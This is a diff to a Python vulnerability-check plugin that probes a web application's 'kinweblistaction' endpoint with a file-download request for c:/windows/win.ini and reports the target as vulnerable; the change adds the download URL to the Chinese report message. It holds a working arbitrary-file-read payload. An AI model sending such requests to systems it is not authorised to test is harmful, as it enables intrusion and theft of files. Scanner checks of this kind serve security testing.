@@ -51,8 +51,8 @@ class Poc(ABPoc):
             payload = arg + "/5clib/kinweblistaction.action?actionName=down&filePath=c:/windows/win.ini"
             code, head, res, errcode, _ = hh.http(payload)
             if code == 200 and 'support' in res and 'MPEGVideo' in res:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;任意下载的url={url}'.format(
+                    target=self.target, name=self.vuln.name, url=payload))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
